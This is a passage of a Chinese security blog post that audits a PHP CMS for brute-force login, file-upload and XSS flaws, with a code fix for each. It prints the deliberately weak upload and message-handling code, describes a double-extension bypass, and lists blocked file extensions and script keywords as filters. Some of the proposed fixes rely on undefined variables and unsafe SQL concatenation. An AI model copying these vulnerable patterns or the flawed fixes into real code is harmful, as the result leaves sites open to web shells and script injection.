             <span class="hljs-variable">$msg</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">getError</span>();
             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;用户名或者密码错误!&#x27;</span>;
             <span class="hljs-comment">// 如果输入的密码不正确，则将login_fail的值+1后再到数据库中更新</span>
             <span class="hljs-variable">$login_fail_count_new</span> = <span class="hljs-variable">$login_fail_count</span> + <span class="hljs-number">1</span>;  <span class="hljs-comment">//</span>
             <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;</span>.<span class="hljs-variable">$login_fail_count_new</span>.<span class="hljs-string">&#x27; WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>);							  <span class="hljs-comment">//</span>
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-variable">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">token</span>()]);
         &#125;</code></pre>



<p>当连续输错五次密码时，账号就被锁定，此时没有任何人能够登录，必须到数据库中需改<code>yzn_loginfo</code>的<code>login_fail</code>的值，这也就达到了防止暴力破解的攻击。</p>
<p>即执行下面这个sql语句</p>
<pre><code class="hljs autohotkey">UPDATE `yzn_loginfo` SET `login_fail`=<span class="hljs-number">0</span> WHERE `login_fail`= <span class="hljs-number">5</span><span class="hljs-comment">;</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408104728600.png" alt="image-20210408104728600"></p>
<h2 id="7-文件上传"><a href="#7-文件上传" class="headerlink" title="7.文件上传"></a>7.文件上传</h2><h3 id="漏洞点一-6"><a href="#漏洞点一-6" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Index.php</code> 中的photo方法</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;
    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;

     <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
        
      <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
   	  <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
      <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];

      <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;

      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;
       &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
       &#125;
        
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
    &#125;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);
&#125;</code></pre>

<p>可以看到上面是使用黑名单，对含有黑名单后缀的文件进行替换，显示这样是很不安全的，使用双写即可绕过，造成了文件上传漏洞</p>
<h4 id="漏洞防御-9"><a href="#漏洞防御-9" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;
      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
      <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;
      <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
  <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];
  <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];

          <span class="hljs-comment">//文件上传漏洞修复 </span>
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$uploaded_name</span>;
  <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;gif&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;
( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp; <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) &amp;&amp; 
( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/gif&#x27;</span> ) 
            ) &#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;
        	   &#125; <span class="hljs-keyword">else</span> &#123;
                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
         	   &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;文件类型不正确&quot;</span>)
  &#125;         
      &#125; <span class="hljs-keyword">else</span> &#123;
          <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
      &#125;
      &#125;
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);
  &#125;

</code></pre>

<p>其中if中的条件如下</p>
<ul>
<li><p><code>( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) </code></p>
<p>保证文件后缀名只能是<code>jpg gif png</code>的一个</p>
</li>
<li><p><code>( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; ) </code></p>
<p>文件的MIME必须为三者中的一个</p>
</li>
<li><p><code>( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp )</code></p>
<p>这是保证文件的大小小10M，并且文件不能空</p>
</li>
</ul>
<h3 id="漏洞点二-6"><a href="#漏洞点二-6" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><p>改代码位于<code>application\attachment\controller\Upload.php</code>中的saveFile方法</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size_limit</span> &gt; <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getInfo</span>(<span class="hljs-string">&#x27;size&#x27;</span>) &gt; <span class="hljs-variable">$size_limit</span>)) &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([
        <span class="hljs-string">&#x27;status&#x27;</span>  =&gt; <span class="hljs-number">0</span>,
        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>,
        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>, //兼容百度
        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>, //兼容editormd
    ]);
&#125;
<span class="hljs-comment">// 判断附件格式是否符合</span>
<span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getInfo</span>(<span class="hljs-string">&#x27;name&#x27;</span>);

<span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-variable">$error_msg</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([
        <span class="hljs-string">&#x27;code&#x27;</span>    =&gt; -<span class="hljs-number">1</span>,
        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-variable">$error_msg</span>,
        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-variable">$error_msg</span>, //兼容百度
        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$error_msg</span>, //兼容editormd
    ]);
&#125;</code></pre>

<p>可以看到这段代码中只是对上传附件的大小进行了检查，而没有对文件的后缀和文件的MIME进行检查，这样攻击者就可以任意的上传文件，造成文件上传漏洞，危害还是很大的。</p>
<h4 id="漏洞防御-10"><a href="#漏洞防御-10" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>对于其的防御方法就是获取文件的类型然后检查其是否符合要求。这里只允许上传<code>png,jpg,jpeg,gif,bmp</code>类型的文件</p>
<pre><code class="hljs php">      <span class="hljs-variable">$file_ext</span>  = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>));<span class="hljs-comment">//获取文件的后缀名</span>

<span class="hljs-comment">// 获取文件的MiME,注意这里不是从客户端的请求头中获取的，而是根据文件的后缀名从php函数中获取，这样就可以防止攻击者修改MIME进行欺骗</span>
      <span class="hljs-keyword">try</span> &#123;
          <span class="hljs-variable">$fileMine</span> = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getMime</span>();
      &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$ex</span>) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-variable">$ex</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();
      &#125;
<span class="hljs-comment">// 禁止MIME为text/x-php或text/html</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/x-php&#x27;</span> || <span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/html&#x27;</span>) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
      &#125;
<span class="hljs-comment">//禁止后缀名为php的</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_grep</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
      &#125;
<span class="hljs-comment">// 禁止上传文件名后缀名在$ext_limit中的</span>
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_grep</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$file_ext</span>/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;附件类型不正确！&#x27;</span>;
      &#125;
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;附件类型不正确！&#x27;</span>;
      &#125;
<span class="hljs-comment">// 禁止上传php,html后缀的文件</span>
      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;php&quot;</span> || <span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;html&quot;</span>) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
      &#125;</code></pre>



<p><strong>方法二</strong></p>
<p>对保存文件的目录修改权限。</p>
<p>已经知道，用户上传的文件会被保存到的<code>public/uploads/images</code>目录下，首先查看一下该文件的权限信息</p>
<pre><code class="hljs avrasm">ls -<span class="hljs-keyword">ld</span> images/</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405202954282.png" alt="image-20210405202954282"></p>
<p>可以看到这是777权限，很明显这个权限设置是不合理的，那么我们将其改为744权限</p>
<pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">744</span> images/</code></pre>

<p>再来查看之前上传上的木马文件就会发现文件不存在，这样就会避免了一句话木马的危害</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405203502846.png" alt="image-20210405203502846"></p>
<h2 id="8-XSS"><a href="#8-XSS" class="headerlink" title="8.XSS"></a>8.XSS</h2><h3 id="漏洞点一-7"><a href="#漏洞点一-7" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
          <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;info/a&#x27;</span>);
          <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];
          <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">MemberModel</span>::<span class="hljs-title function_ invoke__">getByUsername</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;
              <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;用户不存在&#x27;</span>);
          &#125;
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;modelClass-&gt;<span class="hljs-title function_ invoke__">allowField</span>(<span class="hljs-literal">true</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$data</span>)) &#123;
              <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;发送成功！&#x27;</span>);
          &#125; <span class="hljs-keyword">else</span> &#123;
              <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;发送失败！&#x27;</span>);
          &#125;</code></pre>

<p>可以看到这里对用户发送的消息，只是检查了接收消息者是否存在，而没有对用户发送的内容进行检查和过滤，给了攻击者可乘之机，这里就需要对用户输入的内容进行过滤。</p>
<h4 id="漏洞防御-11"><a href="#漏洞防御-11" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>使用php自带的函数<code>htmlspecialchars</code>，将一些特殊字符转义，使其无法工作</p>
<pre><code class="hljs php">首先要知道data的结构
<span class="hljs-comment">/*</span>
<span class="hljs-comment">data的数据结构</span>
<span class="hljs-comment">array(4) &#123;</span>
<span class="hljs-comment">  [&quot;subject&quot;]=&gt;</span>
<span class="hljs-comment">  string(3) &quot;sad&quot;</span>
<span class="hljs-comment">  [&quot;send_to&quot;]=&gt;</span>
<span class="hljs-comment">  string(5) &quot;sunzy&quot;</span>
<span class="hljs-comment">  [&quot;content&quot;]=&gt;</span>
<span class="hljs-comment">  string(2) &quot;ad&quot;</span>
<span class="hljs-comment">  [&quot;send_from&quot;]=&gt;</span>
<span class="hljs-comment">  string(5) &quot;admin&quot;</span>
<span class="hljs-comment">&#125;</span>
<span class="hljs-comment">*/</span>

        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
            <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;info/a&#x27;</span>);
            <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];
	    <span class="hljs-comment">// 短消息XSS防御</span>
	    	<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>] = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>]);
	    	<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">MemberModel</span>::<span class="hljs-title function_ invoke__">getByUsername</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;用户不存在&#x27;</span>);
            &#125;
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;modelClass-&gt;<span class="hljs-title function_ invoke__">allowField</span>(<span class="hljs-literal">true</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$data</span>)) &#123;
                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;发送成功！&#x27;</span>);
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;发送失败！&#x27;</span>);
            &#125;

        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
        &#125;</code></pre>

<p>此时再发送带有恶意脚本的消息时，该脚本就不会被浏览器执行，而是当作普通的字符串</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420154610033.png" alt="image-20210420154610033"></p>
<p><strong>方法二</strong></p>
<p>这里就用一个很安全的过滤函数，这个函数很难被绕过。</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-variable">$ra</span>=<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,<span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);
     
   <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$arr</span>))
   &#123;
     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//循环语句，挨个检测</span>
     &#123;
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>))
        &#123;
          <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>()) 
          &#123;
             <span class="hljs-variable">$value</span>  = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//给单引号（&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span>
          &#125;
          <span class="hljs-variable">$value</span>       = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//删除非打印字符</span>
          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
          <span class="hljs-title function_ invoke__">SafeFilter</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);
        &#125;
     &#125;
   &#125;
&#125;</code></pre>



<h3 id="漏洞点二-7"><a href="#漏洞点二-7" class="headerlink" title="漏洞点二"></a><strong>漏洞点二</strong></h3><h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\member\controller\Index.php</code>中的comment方法</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224100169.png" alt="image-20210419224100169"></p>
<p>很容易看到，没有对提交的数据进行处理，并且将提交的数据在页面使用echo打印出来，导致了XSS漏洞</p>
<h4 id="漏洞防御-12"><a href="#漏洞防御-12" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>使用php自带的函数<code>htmlspecialchars</code>，将一些特殊字符转义，使其无法工作，或者使用上面的过滤函数</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">comment</span>(<span class="hljs-params"></span>)</span>&#123;

    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>())&#123;
        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];
        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$data</span>);
        <span class="hljs-variable">$userId</span> = <span class="hljs-variable language_">$this</span>-&gt;userid;</code></pre>

